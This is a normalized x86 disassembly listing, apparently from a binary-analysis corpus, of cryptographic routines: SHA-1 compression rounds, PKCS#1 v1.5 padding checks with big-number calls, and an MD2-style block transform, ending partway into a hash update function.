lea ebx [ esi + ebx + 0x5a827999 ]
mov esi [ rw-data ]
ror edi 0x2
mov [ rw-data ] esi
mov esi [ rw-data ]
mov [ rw-data ] edi
mov edi esi
mov [ rw-data ] ebx
rol ebx 0x5
add ebx [ rw-data ]
not edi
and edi ebp
mov [ rw-data ] ebp
mov ebp [ rw-data ]
and ebp esi
or edi ebp
mov ebp [ rw-data ]
add edi ebx
mov ebx [ esp + 0x34 ]
lea ebx [ edi + ebx + 0x5a827999 ]
mov edi [ rw-data ]
ror esi 0x2
mov [ rw-data ] esi
mov [ rw-data ] edi
mov edi [ rw-data ]
mov [ rw-data ] ebx
mov esi edi
not esi
and esi ebp
rol ebx 0x5
add ebx [ rw-data ]
mov [ rw-data ] ebp
mov ebp [ rw-data ]
and ebp edi
or esi ebp
mov ebp [ rw-data ]
add esi ebx
mov ebx [ esp + 0x38 ]
lea ebx [ esi + ebx + 0x5a827999 ]
mov esi [ rw-data ]
ror edi 0x2
mov [ rw-data ] esi
mov esi [ rw-data ]
mov [ rw-data ] edi
mov edi esi
mov [ rw-data ] ebx
mov [ rw-data ] ebp
rol ebx 0x5
add ebx [ rw-data ]
not edi
and edi ebp
mov ebp [ rw-data ]
and ebp esi
or edi ebp
mov ebp [ rw-data ]
add edi ebx
mov ebx [ esp + 0x3c ]
lea ebx [ edi + ebx + 0x5a827999 ]
mov edi [ rw-data ]
ror esi 0x2
mov [ rw-data ] esi
mov [ rw-data ] edi
mov edi [ rw-data ]
mov esi edi
not esi
and esi ebp
mov [ rw-data ] ebp
mov ebp [ rw-data ]
mov [ rw-data ] ebx
rol ebx 0x5
add ebx [ rw-data ]
and ebp edi
or esi ebp
add esi ebx
mov ebx [ esp + 0x40 ]
lea ebx [ esi + ebx + 0x5a827999 ]
mov esi [ rw-data ]
mov ebp [ rw-data ]
ror edi 0x2
mov [ rw-data ] esi
mov esi [ rw-data ]
mov [ rw-data ] edi
mov edi esi
mov [ rw-data ] ebx
rol ebx 0x5
add ebx [ rw-data ]
not edi
and edi ebp
mov [ rw-data ] ebp
mov ebp [ rw-data ]
and ebp esi
or edi ebp
mov ebp [ rw-data ]
add edi ebx
mov ebx [ esp + 0x44 ]
lea ebx [ edi + ebx + 0x5a827999 ]
mov edi [ rw-data ]
ror esi 0x2
mov [ rw-data ] esi
mov [ rw-data ] edi
mov edi [ rw-data ]
mov esi edi
not esi
and esi ebp
mov [ rw-data ] ebx
rol ebx 0x5
add ebx [ rw-data ]
mov [ rw-data ] ebp
mov ebp [ rw-data ]
and ebp edi
or esi ebp
mov ebp [ rw-data ]
add esi ebx
mov ebx [ esp + 0x48 ]
lea ebx [ esi + ebx + 0x5a827999 ]
mov esi [ rw-data ]
ror edi 0x2
mov [ rw-data ] esi
mov esi [ rw-data ]
mov [ rw-data ] edi
mov edi esi
mov [ rw-data ] ebx
not edi
and edi ebp
mov [ rw-data ] ebp
mov ebp [ rw-data ]
and ebp esi
rol ebx 0x5
add ebx [ rw-data ]
or edi ebp
mov ebp [ rw-data ]
add edi ebx
mov ebx [ esp + 0x4c ]
lea ebx [ edi + ebx + 0x5a827999 ]
mov edi [ rw-data ]
ror esi 0x2
mov [ rw-data ] esi
mov [ rw-data ] edi
mov edi [ rw-data ]
mov esi edi
not esi
and esi ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebp
mov ebp [ rw-data ]
rol ebx 0x5
add ebx [ rw-data ]
and ebp edi
or esi ebp
add esi ebx
mov ebx [ rw-data ]
lea ecx [ esi + ecx + 0x5a827999 ]
mov esi [ rw-data ]
mov [ rw-data ] esi
mov esi [ rw-data ]
ror edi 0x2
mov [ rw-data ] edi
mov [ rw-data ] ecx
and edi esi
mov ebp esi
rol ecx 0x5
add ecx [ rw-data ]
not ebp
and ebp ebx
or ebp edi
add ebp ecx
mov ecx [ rw-data ]
ror esi 0x2
lea edx [ edx + ebp + 0x5a827999 ]
mov ebp [ rw-data ]
mov [ rw-data ] ebx
mov ebx esi
and ebx ecx
mov [ rw-data ] edx
rol edx 0x5
add edx [ rw-data ]
mov edi ecx
not edi
and edi ebp
or edi ebx
add edi edx
mov edx [ esp + 0x58 ]
mov ebx esi
lea edi [ edi + edx + 0x5a827999 ]
mov edx [ rw-data ]
ror ecx 0x2
mov [ rw-data ] edi
rol edi 0x5
mov [ rw-data ] ebp
add edi [ rw-data ]
mov esi edx
not esi
and esi ebx
mov ebp ecx
and ebp edx
or esi ebp
add esi edi
mov edi [ esp + 0x5c ]
lea esi [ esi + edi + 0x5a827999 ]
mov ebp esi
mov [ rw-data ] ebx
ror edx 0x2
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
mov ecx [ rw-data ]
mov ebx edi
xor ebx edx
xor ebx ecx
add ebx esi
mov esi [ esp + 0x60 ]
lea esi [ ebx + esi + 0x6ed9eba1 ]
mov [ rw-data ] edi
mov ebx edx
ror ecx 0x2
mov edx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov edi ebx
xor edi ecx
xor edi edx
add edi esi
mov esi [ esp + 0x64 ]
lea esi [ edi + esi + 0x6ed9eba1 ]
mov [ rw-data ] ebx
mov edi ecx
ror edx 0x2
mov ecx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edi
xor ebx edx
xor ebx ecx
add ebx esi
mov esi [ esp + 0x68 ]
lea esi [ ebx + esi + 0x6ed9eba1 ]
mov [ rw-data ] edi
ror ecx 0x2
mov ebx edx
mov edx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov edi ebx
xor edi ecx
xor edi edx
add edi esi
mov esi [ esp + 0x6c ]
lea esi [ edi + esi + 0x6ed9eba1 ]
ror edx 0x2
mov [ rw-data ] ebx
mov edi ecx
mov ecx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edi
xor ebx edx
xor ebx ecx
add ebx esi
mov esi [ esp + 0x70 ]
lea esi [ ebx + esi + 0x6ed9eba1 ]
mov [ rw-data ] edi
ror ecx 0x2
mov ebx edx
mov edx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov edi ebx
xor edi ecx
xor edi edx
add edi esi
mov esi [ esp + 0x74 ]
lea esi [ edi + esi + 0x6ed9eba1 ]
ror edx 0x2
mov [ rw-data ] ebx
mov edi ecx
mov ecx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edi
xor ebx edx
xor ebx ecx
add ebx esi
mov esi [ esp + 0x78 ]
lea esi [ ebx + esi + 0x6ed9eba1 ]
mov ebx edx
mov edx ebp
mov ebp esi
ror ecx 0x2
rol esi 0x5
mov [ rw-data ] edi
add esi [ rw-data ]
mov edi ebx
xor edi ecx
xor edi edx
add edi esi
mov esi [ esp + 0x7c ]
lea esi [ edi + esi + 0x6ed9eba1 ]
ror edx 0x2
mov [ rw-data ] esi
mov edi ecx
mov ecx ebp
rol esi 0x5
add esi [ esp + 0x80 ]
mov ebp edi
xor ebp edx
xor ebp ecx
add ebp esi
lea esi [ ebx + ebp + 0x6ed9eba1 ]
mov ebx edx
mov edx [ rw-data ]
ror ecx 0x2
mov [ rw-data ] esi
rol esi 0x5
mov ebp ebx
add esi [ esp + 0x84 ]
xor ebp ecx
xor ebp edx
add ebp esi
lea esi [ edi + ebp + 0x6ed9eba1 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0x88 ]
mov ebp edi
xor ebp edx
xor ebp ecx
add ebp esi
lea esi [ ebx + ebp + 0x6ed9eba1 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0x8c ]
mov ebp ebx
xor ebp ecx
xor ebp edx
add ebp esi
lea esi [ edi + ebp + 0x6ed9eba1 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0x90 ]
mov ebp edi
xor ebp edx
xor ebp ecx
add ebp esi
lea esi [ ebx + ebp + 0x6ed9eba1 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0x94 ]
mov ebp ebx
xor ebp ecx
xor ebp edx
add ebp esi
lea esi [ edi + ebp + 0x6ed9eba1 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0x98 ]
mov ebp edi
xor ebp edx
xor ebp ecx
add ebp esi
lea esi [ ebx + ebp + 0x6ed9eba1 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0x9c ]
mov ebp ebx
xor ebp ecx
xor ebp edx
add ebp esi
lea esi [ edi + ebp + 0x6ed9eba1 ]
mov edi ecx
mov ecx [ rw-data ]
ror edx 0x2
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0xa0 ]
mov ebp edi
xor ebp edx
xor ebp ecx
add ebp esi
lea esi [ ebx + ebp + 0x6ed9eba1 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0xa4 ]
mov ebp ebx
xor ebp ecx
xor ebp edx
add ebp esi
lea esi [ edi + ebp + 0x6ed9eba1 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0xa8 ]
mov ebp edi
xor ebp edx
xor ebp ecx
add ebp esi
lea esi [ ebx + ebp + 0x6ed9eba1 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ esp + 0xac ]
mov ebp ebx
xor ebp ecx
xor ebp edx
add ebp esi
lea esi [ edi + ebp + 0x6ed9eba1 ]
mov [ rw-data ] ebx
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xb0 ]
ror ecx 0x2
lea esi [ ebx + esi - 0x70e44324 ]
mov [ rw-data ] edi
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
mov edi ecx
or edi edx
and edi ebx
rol esi 0x5
add esi [ rw-data ]
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xb4 ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x70e44324 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
mov [ rw-data ] esi
or ebx ebp
add ebx [ esp + 0xb8 ]
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x70e44324 ]
mov ebx edx
mov edx [ rw-data ]
ror ecx 0x2
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xbc ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x70e44324 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xc0 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x70e44324 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xc4 ]
ror edx 0x2
lea esi [ edi + esi - 0x70e44324 ]
mov [ rw-data ] ebx
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xc8 ]
ror ecx 0x2
lea esi [ ebx + esi - 0x70e44324 ]
mov [ rw-data ] edi
mov ebx edx
mov edx [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov [ rw-data ] esi
mov ebp ecx
and ebp edx
rol esi 0x5
add esi [ rw-data ]
or edi ebp
add edi [ esp + 0xcc ]
ror edx 0x2
lea esi [ edi + esi - 0x70e44324 ]
mov [ rw-data ] ebx
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
mov ebx edx
rol esi 0x5
or ebx ecx
add esi [ rw-data ]
and ebx edi
mov [ rw-data ] edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xd0 ]
ror ecx 0x2
lea esi [ ebx + esi - 0x70e44324 ]
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xd4 ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x70e44324 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xd8 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x70e44324 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xdc ]
ror edx 0x2
lea esi [ edi + esi - 0x70e44324 ]
mov [ rw-data ] ebx
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xe0 ]
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x70e44324 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov ebp ecx
and ebp edx
mov [ rw-data ] esi
or edi ebp
add edi [ esp + 0xe4 ]
rol esi 0x5
add esi [ rw-data ]
lea esi [ edi + esi - 0x70e44324 ]
mov [ rw-data ] ebx
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xe8 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x70e44324 ]
ror ecx 0x2
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xec ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x70e44324 ]
ror edx 0x2
mov edi ecx
mov ecx [ rw-data ]
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov ebx edx
or ebx ecx
and ebx edi
mov ebp edx
and ebp ecx
or ebx ebp
add ebx [ esp + 0xf0 ]
ror ecx 0x2
lea esi [ ebx + esi - 0x70e44324 ]
mov [ rw-data ] edi
mov ebx edx
mov edx [ rw-data ]
mov [ rw-data ] esi
mov edi ecx
or edi edx
and edi ebx
rol esi 0x5
add esi [ rw-data ]
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xf4 ]
mov [ rw-data ] ebx
ror edx 0x2
lea esi [ edi + esi - 0x70e44324 ]
mov edi ecx
mov ecx [ rw-data ]
mov ebx edx
or ebx ecx
mov [ rw-data ] esi
and ebx edi
mov ebp edx
and ebp ecx
rol esi 0x5
add esi [ rw-data ]
or ebx ebp
add ebx [ esp + 0xf8 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x70e44324 ]
mov ebx edx
mov edx [ rw-data ]
ror ecx 0x2
mov [ rw-data ] esi
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
or edi edx
and edi ebx
mov ebp ecx
and ebp edx
or edi ebp
add edi [ esp + 0xfc ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x70e44324 ]
ror edx 0x2
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov edi ecx
mov ecx [ rw-data ]
mov ebx edi
xor ebx edx
xor ebx ecx
add ebx [ esp + 0x100 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
ror ecx 0x2
mov ebx edx
mov edi ebx
xor edi ecx
mov edx ebp
xor edi edx
add edi [ esp + 0x104 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
ror edx 0x2
mov edi ecx
mov ebx edi
xor ebx edx
mov ecx ebp
xor ebx ecx
add ebx [ esp + 0x108 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
ror ecx 0x2
mov ebx edx
mov edi ebx
xor edi ecx
mov edx ebp
xor edi edx
add edi [ esp + 0x10c ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
mov edi ecx
ror edx 0x2
mov ebx edi
xor ebx edx
mov ecx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
xor ebx ecx
add ebx [ esp + 0x110 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
mov ebx edx
ror ecx 0x2
mov edi ebx
xor edi ecx
mov edx ebp
mov ebp esi
xor edi edx
add edi [ esp + 0x114 ]
rol esi 0x5
add esi [ rw-data ]
lea esi [ edi + esi - 0x359d3e2a ]
mov [ rw-data ] ebx
ror edx 0x2
mov edi ecx
mov ebx edi
xor ebx edx
mov ecx ebp
xor ebx ecx
add ebx [ esp + 0x118 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
ror ecx 0x2
mov ebx edx
mov edi ebx
xor edi ecx
mov edx ebp
xor edi edx
add edi [ esp + 0x11c ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
ror edx 0x2
mov edi ecx
mov ebx edi
xor ebx edx
mov ecx ebp
xor ebx ecx
add ebx [ esp + 0x120 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
ror ecx 0x2
mov ebx edx
mov edi ebx
xor edi ecx
mov edx ebp
xor edi edx
add edi [ esp + 0x124 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
ror edx 0x2
mov edi ecx
mov ebx edi
xor ebx edx
mov ecx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
xor ebx ecx
add ebx [ esp + 0x128 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
mov ebx edx
ror ecx 0x2
mov edi ebx
xor edi ecx
mov edx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
xor edi edx
add edi [ esp + 0x12c ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
mov edi ecx
ror edx 0x2
mov ecx ebp
mov ebp esi
mov ebx edi
rol esi 0x5
xor ebx edx
add esi [ rw-data ]
xor ebx ecx
add ebx [ esp + 0x130 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
ror ecx 0x2
mov ebx edx
mov edi ebx
xor edi ecx
mov edx ebp
xor edi edx
add edi [ esp + 0x134 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
ror edx 0x2
mov edi ecx
mov ebx edi
xor ebx edx
mov ecx ebp
xor ebx ecx
add ebx [ esp + 0x138 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
ror ecx 0x2
mov ebx edx
mov edi ebx
xor edi ecx
mov edx ebp
xor edi edx
add edi [ esp + 0x13c ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
ror edx 0x2
mov edi ecx
mov ebx edi
xor ebx edx
mov ecx ebp
xor ebx ecx
add ebx [ esp + 0x140 ]
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
mov ebx edx
ror ecx 0x2
mov edi ebx
xor edi ecx
mov edx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
xor edi edx
add edi [ esp + 0x144 ]
mov [ rw-data ] ebx
lea esi [ edi + esi - 0x359d3e2a ]
mov edi ecx
ror edx 0x2
mov ebx edi
xor ebx edx
mov ecx ebp
mov ebp esi
rol esi 0x5
add esi [ rw-data ]
xor ebx ecx
add ebx [ esp + 0x148 ]
mov [ rw-data ] edi
lea esi [ ebx + esi - 0x359d3e2a ]
mov ebx edx
ror ecx 0x2
mov edx ebp
mov edi esi
rol esi 0x5
add esi [ rw-data ]
mov ebp ebx
xor ebp ecx
xor ebp edx
add ebp [ esp + 0x14c ]
ror edx 0x2
lea esi [ esi + ebp - 0x359d3e2a ]
mov ebp [ eax ]
add ebp esi
mov [ rw-data ] esi
mov esi [ eax + 0x4 ]
add esi edi
mov [ eax + 0x4 ] esi
mov esi [ eax + 0x8 ]
add esi edx
mov [ rw-data ] edx
mov edx [ eax + 0xc ]
mov [ rw-data ] edi
pop edi
add edx ecx
mov [ rw-data ] ecx
mov ecx [ eax + 0x10 ]
mov [ eax + 0x8 ] esi
pop esi
mov [ eax ] ebp
add ecx ebx
pop ebp
mov [ rw-data ] ebx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] ecx
pop ebx
add esp 0x148
retn
sub_1001b61f
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x64 ] eax
mov eax [ ebp + 0x70 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x74 ]
push esi
mov [ ebp - 0x20 ] eax
mov esi ecx
movzx eax [ esi ]
add eax 0x7
cdq
and edx 0x7
add eax edx
push edi
mov edi eax
sar edi 0x3
cmp [ ebp + 0x7c ] edi
jbe r-xdata
push ebx
push [ ebp + 0x7c ]
lea eax [ ebp - 0x1c ]
push [ ebp + 0x78 ]
lea ebx [ ebp - 0x28 ]
push eax
call sub_1001b6ed
add esp 0xc
pop ebx
test eax eax
jne r-xdata
mov eax 0x406
jmp r-xdata
mov ecx [ ebp + 0x64 ]
pop edi
xor ecx ebp
pop esi
call sub_100242d7
add ebp 0x68
leave
retn
cmp [ ebp - 0x28 ] edi
jne r-xdata
cmp [ ebp - 0x1c ] al
jne r-xdata
mov eax 0x401
cmp [ ebp - 0x1b ] 0x1
jne r-xdata
push 0x2
pop ecx
lea eax [ edi - 0x1 ]
cmp eax ecx
jbe r-xdata
mov al [ ebp + ecx - 0x1c ]
inc ecx
test al al
jne r-xdata
cmp [ ebp + ecx - 0x1c ] 0xff
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax edi
sub eax ecx
mov [ edx ] eax
lea edx [ eax + 0xb ]
cmp edx edi
ja r-xdata
inc ecx
cmp ecx eax
jb r-xdata
mov esi eax
lea eax [ ebp + ecx - 0x1c ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx eax
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
dec esi
jne r-xdata
sub_1001b6ed
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x214
push edi
push [ ebp + 0x78 ]
lea eax [ ebp - 0x124 ]
push eax
mov eax [ ebp + 0x7c ]
call sub_100193ed
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov edi 0x80
mov eax edi
call sub_100193ed
lea eax [ esi + 0x82 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
mov eax edi
call sub_100193ed
add esp 0x18
push 0x20
pop eax
push 0x20
lea edi [ eax + 0x1 ]
pop eax
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
inc eax
mov [ ebp + 0x68 ] eax
lea eax [ ebp - 0x124 ]
push eax
mov ecx edi
lea edx [ ebp - 0x1c ]
call sub_10019a5a
pop ecx
test eax eax
jl r-xdata
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
cmp [ ebp + eax * 4 - 0x1c ] 0x0
jne r-xdata
movzx eax [ esi ]
add eax 0x7
mov ecx [ ebp + 0x68 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ebx ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
mov eax edi
call sub_10019941
push edi
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp + 0x74 ]
mov eax [ ebx ]
call sub_10019438
add esp 0x1c
xor eax eax
mov eax 0x401
jmp r-xdata
cmp [ ebp + eax * 4 - 0xa0 ] 0x0
jne r-xdata
pop edi
add ebp 0x6c
leave
retn
sub_1001b7d1
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov ebx eax
mov eax [ esi + 0x20 ]
push 0x10
pop edi
lea ecx [ eax + ebx ]
and ecx 0xf
sub edi eax
mov [ esi + 0x20 ] ecx
cmp ebx edi
jb r-xdata
xor edi edi
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea eax [ eax + esi + 0x24 ]
test edi edi
je r-xdata
pop edi
pop ebx
leave
retn
sub eax ecx
lea ecx [ esi + 0x24 ]
push ecx
lea eax [ esi + 0x10 ]
push eax
mov ecx esi
call sub_1001b8b0
lea eax [ edi + 0xf ]
pop ecx
pop ecx
cmp eax ebx
jae r-xdata
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec [ ebp - 0x4 ]
jne r-xdata
sub ebx edi
mov ecx [ ebp + 0x8 ]
lea ecx [ edi + ecx ]
lea eax [ eax + esi + 0x24 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
lea eax [ eax + ecx - 0xf ]
push eax
lea eax [ esi + 0x10 ]
push eax
mov ecx esi
call sub_1001b8b0
add [ ebp - 0x4 ] 0x10
pop ecx
add edi 0x10
pop ecx
cmp [ ebp - 0x4 ] ebx
jb r-xdata
sub_1001b86b
push esi
push edi
push 0x10
mov esi eax
pop edi
mov eax edi
sub eax [ esi + 0x20 ]
push [ eax * 4 + rw-data ]
call sub_1001b7d1
lea eax [ esi + 0x10 ]
push eax
mov eax edi
call sub_1001b7d1
pop ecx
pop ecx
mov ecx [ esp + 0xc ]
mov eax esi
sub ecx esi
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
dec edi
jne r-xdata
push 0x34
push edi
push esi
call sub_10024b80
add esp 0xc
pop edi
pop esi
retn
sub_1001b8b0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov edx [ ebp + 0xc ]
push edi
mov esi ecx
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
mov esi edx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
push 0x10
mov [ ebp - 0x38 ] ecx
lea ecx [ ebp - 0x14 ]
pop edi
sub esi edx
sub ecx edx
push ebx
mov bl [ esi + edx ]
xor bl [ edx ]
mov [ ecx + edx ] bl
inc edx
dec edi
jne r-xdata
xor esi esi
xor edx edx
mov bl [ esi + rw-data ]
lea ecx [ ebp + edi - 0x34 ]
xor [ ecx ] bl
movzx esi [ ecx ]
inc edi
cmp edi 0x30
jb r-xdata
add esi edx
and esi 0xff
inc edx
cmp edx 0x12
jb r-xdata
xor edi edi
mov edi [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
lea esi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x10
movsd [ edi ] [ esi ]
movzx ecx [ eax + 0xf ]
pop esi
sub edx eax
pop ebx
movzx edi [ edx + eax ]
xor edi ecx
mov cl [ edi + rw-data ]
xor [ eax ] cl
movzx ecx [ eax ]
inc eax
dec esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
sub_1001b959
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x10 ]
push edi
mov edi eax
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
mov [ esi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push ebx
push 0x40
mov ecx edi
shr ecx 0x1d
